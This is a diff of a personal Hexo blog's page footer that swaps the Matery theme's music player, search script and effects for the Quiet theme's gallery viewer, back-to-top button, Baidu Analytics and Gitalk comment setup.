-        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
-<style>
-    .aplayer .aplayer-lrc p {
-        
-        display: none;
-        
-        font-size: 12px;
-        font-weight: 700;
-        line-height: 16px !important;
-    }
-
-    .aplayer .aplayer-lrc p.aplayer-lrc-current {
-        
-        display: none;
-        
-        font-size: 15px;
-        color: #42b983;
-    }
-
-    
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
-        left: -66px !important;
-    }
-
-    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
-        left: 0px !important;
-    }
-
-    
-</style>
-<div class="">
-    
-    <div class="row">
-        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
-                   server="tencent"
-                   type="playlist"
-                   id="503838841"
-                   fixed='true'
-                   autoplay='false'
-                   theme='#42b983'
-                   loop='all'
-                   order='random'
-                   preload='auto'
-                   volume='0.7'
-                   list-folded='true'
-        >
-        </meting-js>
-    </div>
-</div>
-
-<script src="/libs/aplayer/APlayer.min.js"></script>
-<script src="/libs/aplayer/Meting.min.js"></script>
-
-    
-
-    <div class="container row center-align"
-         style="margin-bottom: 0px !important;">
-        <div class="col s12 m8 l8 copy-right">
-            Copyright&nbsp;&copy;
-            
-                <span id="year">2019-2024</span>
-            
-            <a href="/about" target="_blank">Jeremiah</a>
-            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
-            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
-            
-            <br>
-            
-            
-            
-                
-            
-            
-                <span id="busuanzi_container_site_pv">
-                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
-                    <span id="busuanzi_value_site_pv" class="white-color"></span>
-            </span>
-            
-            
-                <span id="busuanzi_container_site_uv">
-                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
-                    <span id="busuanzi_value_site_uv" class="white-color"></span>
-            </span>
-            
-            <br>
-
-            <!-- 运行天数提醒. -->
-            
-            <br>
-            
-        </div>
-        <div class="col s12 m4 l4 social-link social-statis">
-
-
-    <a href="mailto:1526100148@qq.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
-        <i class="fas fa-envelope-open"></i>
-    </a>
-
-
-
-
-
-
-
-    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=1526100148" class="tooltipped" target="_blank" data-tooltip="QQ联系我: 1526100148" data-position="top" data-delay="50">
-        <i class="fab fa-qq"></i>
-    </a>
-
-
-
-
-
-
-
-    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
-        <i class="fas fa-rss"></i>
-    </a>
-
-</div>
-    </div>
-</footer>
-
-<div class="progress-bar"></div>
-
-
-    <!-- 搜索遮罩框 -->
-<div id="searchModal" class="modal">
-    <div class="modal-content">
-        <div class="search-header">
-            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
-            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
-                   class="search-input">
-        </div>
-        <div id="searchResult"></div>
-    </div>
-</div>
-
-<script type="text/javascript">
-$(function () {
-    var searchFunc = function (path, search_id, content_id) {
-        'use strict';
-        $.ajax({
-            url: path,
-            dataType: "xml",
-            success: function (xmlResponse) {
-                // get the contents from search data
-                var datas = $("entry", xmlResponse).map(function () {
-                    return {
-                        title: $("title", this).text(),
-                        content: $("content", this).text(),
-                        url: $("url", this).text()
-                    };
-                }).get();
-                var $input = document.getElementById(search_id);
-                var $resultContent = document.getElementById(content_id);
-                $input.addEventListener('input', function () {
-                    var str = '<ul class=\"search-result-list\">';
-                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
-                    $resultContent.innerHTML = "";
-                    if (this.value.trim().length <= 0) {
-                        return;
-                    }
-                    // perform local searching
-                    datas.forEach(function (data) {
-                        var isMatch = true;
-                        var data_title = data.title.trim().toLowerCase();
-                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
-                        var data_url = data.url;
-                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
-                        var index_title = -1;
-                        var index_content = -1;
-                        var first_occur = -1;
-                        // only match artiles with not empty titles and contents
-                        if (data_title !== '' && data_content !== '') {
-                            keywords.forEach(function (keyword, i) {
-                                index_title = data_title.indexOf(keyword);
-                                index_content = data_content.indexOf(keyword);
-                                if (index_title < 0 && index_content < 0) {
-                                    isMatch = false;
-                                } else {
-                                    if (index_content < 0) {
-                                        index_content = 0;
-                                    }
-                                    if (i === 0) {
-                                        first_occur = index_content;
-                                    }
-                                }
-                            });
-                        }
-                        // show search results
-                        if (isMatch) {
-                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
-                            var content = data.content.trim().replace(/<[^>]+>/g, "");
-                            if (first_occur >= 0) {
-                                // cut out 100 characters
-                                var start = first_occur - 20;
-                                var end = first_occur + 80;
-                                if (start < 0) {
-                                    start = 0;
-                                }
-                                if (start === 0) {
-                                    end = 100;
-                                }
-                                if (end > content.length) {
-                                    end = content.length;
-                                }
-                                var match_content = content.substr(start, end);
-                                // highlight all keywords
-                                keywords.forEach(function (keyword) {
-                                    var regS = new RegExp(keyword, "gi");
-                                    match_content = match_content.replace(regS, "<em class=\"search-keyword\">" + keyword + "</em>");
-                                });
-
-                                str += "<p class=\"search-result\">" + match_content + "...</p>"
-                            }
-                            str += "</li>";
-                        }
-                    });
-                    str += "</ul>";
-                    $resultContent.innerHTML = str;
-                });
-            }
-        });
-    };
-
-    searchFunc('/search.xml', 'searchInput', 'searchResult');
+  
+Fancybox.bind('[data-fancybox="fancybox-gallery-img"]', {
+  dragToClose: true,
+  Toolbar: true,
+  closeButton: "top",
+  Image: {
+    zoom: true,
+  },
+  on: {
+    initCarousel: (fancybox) => {
+      const slide = fancybox.Carousel.slides[fancybox.Carousel.page];
+      fancybox.$container.style.setProperty(
+        "--bg-image",
+        `url("${slide.$thumb.src}")`
+      );
+    },
+    "Carousel.change": (fancybox, carousel, to, from) => {
+      const slide = carousel.slides[to];
+      fancybox.$container.style.setProperty(
+        "--bg-image",
+        `url("${slide.$thumb.src}")`
+      );
+    },
+  },
 });
 </script>
 
-    <!-- 白天和黑夜主题 -->
-<div class="stars-con">
-    <div id="stars"></div>
-    <div id="stars2"></div>
-    <div id="stars3"></div>  
+<style>
+    #noneimg img {
+        display: none;
+        z-index: 9999;
+        /* width: 600px !important; */
+        min-width: 0%;
+        max-width: 90%;
+        max-height: 80%;
+        border-radius: 0px;
+        position: fixed;
+        box-shadow: 0 0 0px #c3c3c300 !important;
+        left: 0;
+        top: 0;
+        right: 0;
+        bottom: 0;
+        margin: auto !important;
+    }
+
+    @media screen and (max-width:600px) {
+        #noneimg img {
+            max-width: 88%
+        }
+    }
+</style>
+
+    <div class="post-paging">
+    
+    <a href="/2024/12/03/adctf/">
+        <div class="post-paging-last">
+            <span>上一篇</span>
+            <p>ADCTF</p>
+        </div>
+    </a>
+    
+
+    
+    <a href="/2024/10/30/newstarctf2024-re-fang-xiang-wp-hui-zong/">
+        <div class="post-paging-next">
+            <span>下一篇</span>
+            <p>NewStarCTF2024 Re方向wp汇总</p>
+        </div>
+    </a>
+    
+</div>
+</div>
+		
+<div class="footer">
+	<div class="Copyright">
+		©2024 By Jeremiah. 主题：<a
+			style="text-decoration: none;display: contents; color: #898F9F;"
+			target="_blank" rel="noopener" href="https://github.com/79e/hexo-theme-quiet">Quiet</a>
+	</div>
+	<div class="contact">
+		
+		<a target="_blank" rel="noopener" href="https://github.com/79E/hexo-theme-quiet">
+			<img src="https://cdn.jsdelivr.net/gh/duogongneng/MyBlogImg/imggithub.png" alt="Quiet主题">
+		</a>
+		
+	</div>
 </div>
 
-<script>
-    function switchNightMode() {
-        $('<div class="Cuteen_DarkSky"><div class="Cuteen_DarkPlanet"></div></div>').appendTo($('body')),
-        setTimeout(function () {
-            $('body').hasClass('DarkMode') 
-            ? ($('body').removeClass('DarkMode'), localStorage.setItem('isDark', '0'), $('#sum-moon-icon').removeClass("fa-sun").addClass('fa-moon')) 
-            : ($('body').addClass('DarkMode'), localStorage.setItem('isDark', '1'), $('#sum-moon-icon').addClass("fa-sun").removeClass('fa-moon')),
-            
-            setTimeout(function () {
-            $('.Cuteen_DarkSky').fadeOut(1e3, function () {
-                $(this).remove()
-            })
-            }, 2e3)
-        })
+<script src="/js/gotop.js"></script>
+
+
+<style type="text/css">
+    @media screen and (min-width: 600px) {
+        .goTop>span {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border-radius: 10px;
+            width: 40px;
+            height: 40px;
+            cursor: pointer;
+            opacity: 0.8;
+            background: rgba(18, 24, 58, 0.06);
+            text-align: center;
+            transition: border .5s;
+            border: 1px solid rgba(18, 24, 58, 0.06);
+
+            -moz-transition: border .5s;
+            /* Firefox 4 */
+            -webkit-transition: border .5s;
+            /* Safari 和 Chrome */
+            -o-transition: border .5s;
+            /* Opera */
+        }
+
+        .goTop>span:hover {
+            border: 1px solid #6680B3;
+        }
+
+
+        .goTop {
+            position: fixed;
+            right: 30px;
+            bottom: 80px;
+        }
+
+        .goTop>span>svg {
+            width: 20px;
+            height: 20px;
+            opacity: 0.7;
+        }
+
     }
+
+    @media screen and (max-width: 600px) {
+        .goTop {
+            display: none;
+        }
+    }
+</style>
+<div class="goTop" id="js-go_top">
+    <span>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24">
+            <g>
+                <path d="M13 12v8h-2v-8H4l8-8 8 8z"></path>
+            </g>
+        </svg>
+    </span>
+</div>
+<script>
+    $( '#js-go_top' )
+	.gotoTop( {
+		offset: 500,
+		speed: 300,
+		animationShow: {
+			'transform': 'translate(0,0)',
+			'transition': 'transform .5s ease-in-out'
+		},
+		animationHide: {
+			'transform': 'translate(100px,0)',
+			'transition': 'transform .5s ease-in-out'
+		}
+	} );
 </script>
 
-    <!-- 回到顶部按钮 -->
-<div id="backTop" class="top-scroll">
-    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
-        <i class="fas fa-arrow-up"></i>
-    </a>
-</div>
 
-
-    <script src="/libs/materialize/materialize.min.js"></script>
-    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
-    <script src="/libs/aos/aos.js"></script>
-    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
-    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
-    <script src="/js/matery.js"></script>
-
-    
-
-    
-    
-    
-
-    <!-- 雪花特效 -->
-     
-        <script type="text/javascript">
-            // 只在桌面版网页启用特效
-            var windowWidth = $(window).width();
-            if (windowWidth > 768) {
-                document.write('<script type="text/javascript" src="/libs/others/snow.js"><\/script>');
-            }
-        </script>
-    
-
-    <!-- 鼠标星星特效 -->
-    
-
-     
-        <script src="https://ssl.captcha.qq.com/TCaptcha.js"></script>
-        <script src="/libs/others/TencentCaptcha.js"></script>
-        <button id="TencentCaptcha" data-appid="xxxxxxxxxx" data-cbfn="callback" type="button" hidden></button>
-    
-
-    <!-- Baidu Analytics -->
-
-    <!-- Baidu Push -->
-
-<script>
+<!-- Baidu Analytics -->
+<script defer>
+    var _hmt = _hmt || [];
     (function () {
-        var bp = document.createElement('script');
-        var curProtocol = window.location.protocol.split(':')[0];
-        if (curProtocol === 'https') {
-            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
-        } else {
-            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
-        }
+        var hm = document.createElement("script");
+        hm.src = "https://hm.baidu.com/hm.js?4b5fe1472f22fadsfs";
         var s = document.getElementsByTagName("script")[0];
-        s.parentNode.insertBefore(bp, s);
+        s.parentNode.insertBefore(hm, s);
     })();
 </script>
 
-    
-    <script src="/libs/others/clicklove.js" async="async"></script>
-    
-    
-    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
-    
 
-    
 
-    
+    <!-- Gitalk -->
+    <script>
+        const data = '{"clientID":"02b3c","clientSecret":"adfc7b4","repo":"gimment","owner":"duneng","admin":"duneng"}'
+        const gitalk = new Gitalk({
+            ...JSON.parse( data),
+            id:location.pathname,
+            distractionFreeMode:false
+        })
+        
+        if(Boolean('true')){
+            gitalk.render('gitalk-container')
+        }
+    </script>
 
-    <!--腾讯兔小巢-->
-    
-    
-
-    
-
-    
-
-    
-    <script src="/libs/instantpage/instantpage.js" type="module"></script>
-    
-
-</body>
-
+<script>
+	console.log('\n %c Hexo-Quiet 主题 %c https://github.com/79e/hexo-theme-quiet \n', 'color: #fadfa3; background: #030307; padding:5px 0;', 'background: #fadfa3; padding:5px 0;')
+</script>
+	</body>
 </html>
+
